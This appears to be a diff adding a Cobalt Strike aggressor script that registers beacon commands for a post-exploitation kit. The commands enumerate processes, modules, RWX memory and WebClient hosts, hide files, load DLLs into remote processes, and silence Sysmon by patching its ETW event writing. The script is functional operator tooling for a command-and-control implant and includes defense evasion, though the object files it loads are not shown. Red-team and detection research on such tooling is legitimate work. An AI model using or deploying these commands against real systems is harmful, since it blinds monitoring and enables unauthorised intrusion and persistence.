+    "INFO:\nFind a specific loaded module in all processes OR list all loaded modules in a specific process.\n\nOPTIONS:\n[search]: find all processes that have loaded a specific module (e.g. winhttp.dll or ws2_32.dll).\n[list]: list all loaded modules in a remote process.\n\n" .
+    "USAGE:\nenumlib search <module name>\nenumlib list <pid>\n\n");
+	
+
+
+alias enumlib {
+    $bid = $1;
+    $option = $2;
+    $target = $3;
+
+    if ($option eq "") {
+        berror($bid, "Please specify one of the following enumeration options: search | list\n");
+        return;
+    }
+
+    if ($option eq "search" || $option eq "list") {
+        if ($option eq "search" && $target eq "") {
+            berror($bid, "Please specify a module name to search for\n");
+            return;
+        }
+
+        if ($option eq "list" && $target eq "") {
+            berror($bid, "Please specify the pid of the target process to enumerate\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This enumeration option isn't supported. Please specify one of the following enumeration options: search | list\n");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumLib/enumlib.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    if ($option eq "search") {
+       $arg_data  = bof_pack($bid, "zz", $option, $target);
+    }
+    else {
+        $arg_data  = bof_pack($bid, "zi", $option, $target);
+    }
+
+    blog($bid, "Tasked to enumerate loaded modules..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumrwx", "Enumerate RWX memory regions in a target process.",
+    "INFO:\nFind processes that already have memory allocated for read/write/execute (like most .NET processes)\n\nOPTIONS:\n[pid]: target process to enumerate\n\n" .
+    "USAGE:\nenumrwx <pid>\n\n");
+
+alias enumrwx {
+    $bid = $1;
+    $pid = $2;
+
+    if ($pid eq "") {
+        berror($bid, "Please make sure that the PID of the target process is specified.");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumRWX/enumrwx.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "i", $pid);
+
+    blog($bid, "Tasked to verify if the target process has RWX memory regions..");
+
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "enumsysmon", "Verify if Sysmon is running.",
+    "INFO:\nVerify if Sysmon is running. This can be done by checking the registry or by enumerating Minifilter drivers and search for one that is associated with Sysmon.\n\nOPTIONS:\n[reg]: search the registry to check if Sysmon is present on the system and return the Sysmon service PID if active.\n[driver]: list all the Minifilter drivers on the system to check manually (requires elevated privileges).\n\n" .
+    "USAGE:\nenumsysmon <reg | driver>\n\n");
+
+
+alias enumsysmon {
+    $bid = $1;
+    $action = $2;
+
+    if ($action eq "reg" || $action eq "driver") {
+    }
+    else {
+        berror($bid, "Please specify one of the following enumeration options: reg | driver\n");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumSysmon/enumsysmon.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "z", $action);
+
+    blog($bid, "Tasked to find Sysmon..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"enumwebclient", "Find running WebClient services.",
+	"INFO:\nFind hosts with the WebClient service running based on a list with predefined hostnames or IP addresses. The list is loaded from your own attacker system.\n\n" .
+	"ARGUMENTS:\n[<path to file>]: the path on your own attacker system to the file containing the list with predefined hostnames. Each hostname must be newline separated.\n[debug]: optional argument to include hostnames in the output that couldn't be reached or on which the WebClient was not running.\n\n" .
+	"USAGE:\nenumwebclient <path to hostname file> [opt:debug]\n\n" .
+	"EXAMPLES:\nenumwebclient C:\\Users\\redmed\\Documents\\hostnames.txt\nenumwebclient C:\\Users\\redmed\\Documents\\hostnames.txt debug\n\n");
+	
+alias enumwebclient {
+    $bid = $1;
+	$path = $2;
+	$debug = $3;
+	
+	if ($path eq "") {
+		berror($bid, "Please specify the path on your own attacker system to the file containing the list with newline separated hostnames.\n");
+		return;
+	}
+
+	
+	# read in the .txt file
+	$handle = openf("$path");
+	$file = readb($handle, -1);
+	closef($handle);
+	
+	blog($bid, "path: $+  $path");
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/EnumWebClient/enumwebclient.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "bz", $file, $debug);
+
+	blog($bid, "Tasked to find running WebClient services..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"forcelockscreen", "Force the lock screen of the current user session.",
+	"INFO:\nForce the lock screen of the current user session.\n\n" .
+	"USAGE:\nforcelockscreen\n\n");
+	
+alias forcelockscreen {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/ForceLockScreen/forcelockscreen.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+
+    $arg_data  = bof_pack($bid);
+
+    blog($bid, "Tasked to lock the current user's screen..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "hidefile", "Hide file or directory by setting it's attributes to systemfile + hidden.",
+    "INFO:\nHide a directory or file from plain sight by modifying the attributes and set them to systemfile + hidden.\n\nOPTIONS:\n[dir]: set this option if you want to modify the attributes of a directory.\n[file]: set this option if you want to modify the attributes of a file.\n[<path to dir/file>]: path to the directory or file that you want to hide.\n\n" .
+    "USAGE:\nhidefile <dir | file> <path to dir/file>\n\n");
+
+
+alias hidefile {
+    $bid = $1;
+    $option = $2;
+    $path = $3;
+
+    if ($option eq "") {
+        berror($bid, "Please specify one of the following options: dir | file\n");
+        return;
+    }
+
+    if ($option eq "dir" || $option eq "file") {
+        if ($path eq "") {
+            berror($bid, "Please specify the correct path to the target directory or file.\n");
+            return;
+        }
+    }
+    else {
+        berror($bid, "This option isn't supported. Please specify one of the following options: dir | file\n");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/HideFile/hidefile.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "zZ", $option, $path);
+
+    blog($bid, "Tasked to hide directory or file..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"idletime", "Check current user activity based on the user's last input",
+	"INFO:\nCheck current user activity based on the user's last input. Returns the time in format HH:MM:SS.\n\n" .
+	"USAGE:\nidletime\n\n");
+	
+alias idletime {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/IdleTime/idletime.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	blog($bid, "Tasked to check user activity..");
+    beacon_inline_execute($bid, $data, "go", $null);
+}
+
+
+beacon_command_register(
+    "loadlib", "Load DLL from disk in remote process via RPC call.",
+    "INFO:\nLoad a on disk present DLL via RtlRemoteCall API in a remote process.\nDepending on the process from which you run this tool, it may or may not work.\n\nOPTIONS:\n[pid]: target process to load the DLL into\n[path]: full path to the on disk present DLL\n\n" .
+    "USAGE:\nloadlib <pid> <path to dll>\n\n");
+
+
+alias loadlib {
+    $bid = $1;
+    $pid = $2;
+    $path = $3;
+
+    if ($pid eq "" || $path eq "") {
+        berror($bid, "Please make sure that both the PID and PATH are specified.");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/LoadLib/loadlib.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "iz", $pid, $path);
+
+    blog($bid, "Tasked to load DLL in remote process..");
+
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "psremote", "List all running processes on a remote host.",
+    "INFO:\nGet a list of all processes running on the remote host.\n\n" .
+    "USAGE:\npsremote <FQDN or IP remote host>\n\n");
+
+
+alias psremote {
+    $bid = $1;
+    $remotehost = $2;
+
+    # read in the right BOF file
+    $handle = openf(script_resource("KIT/PSremote/psremote.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # pack our arguments
+    $arg_data = bof_pack($bid, "z", $remotehost);
+
+    blog($bid, "Tasked to list running processes..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+    "silencesysmon", "Silence Sysmon by patching its capability to write ETW events to the log.",
+    "INFO:\nSilence the Sysmon service by patching its capability to write ETW events to the log.\nRestarting the Sysmon service or the system itself will clear the patch and Sysmon will resume working normally.\nAltough this will not leave any traces in the log, there will be a time gap between the last and first new event.\n\nOPTIONS:\n[pid]: the process ID of the Sysmon service running on the system.\n\n" .
+    "USAGE:\nsilencesysmon <sysmon pid>\n\n");
+
+
+alias silencesysmon {
+    $bid = $1;
+    $pid = $2;
+
+    if ($pid eq "") {
+        berror($bid, "Please specify the process ID of the Sysmon service.\n");
+        return;
+    }
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/SilenceSysmon/silencesysmon.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "i", $pid);
+
+    blog($bid, "Tasked to silence Sysmon..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+beacon_command_register(
+	"systeminfo", "Enumerate system information.",
+	"INFO:\nEnumerate system information via WMI.\n\n" .
+	"USAGE:\nsysteminfo\n\n");
+	
+alias systeminfo {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("KIT/SystemInfo/systeminfo.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	$arg_data  = bof_pack($bid);
+
+	blog($bid, "Tasked to connect to ROOT\\CIMV2 to fetch system information..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
